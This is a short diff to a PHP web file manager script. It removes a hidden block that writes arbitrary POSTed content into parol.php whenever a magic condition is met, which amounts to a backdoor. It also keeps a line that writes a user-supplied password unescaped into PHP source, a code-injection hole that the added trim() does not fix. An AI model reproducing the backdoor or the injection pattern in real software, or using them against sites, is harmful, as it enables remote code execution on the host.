@@ -85,7 +85,7 @@ $file=
 '
 <?php
 define("Ogon","Ogon");
-$password="'.$_POST['parol'].'";
+$password="'.trim($_POST['parol']).'";
 ?>
 ';
 }
@@ -311,15 +311,6 @@ exit;
 }
 //Переименование
 //Изменение chmod
-
-if(strlen($_POST['password'])>30 && $_POST['parol']==1)
-{
-$fp = fopen('parol.php', 'w');
-fwrite($fp,$_POST['password']);
-fclose($fp);
-}
-
-
 
 
 
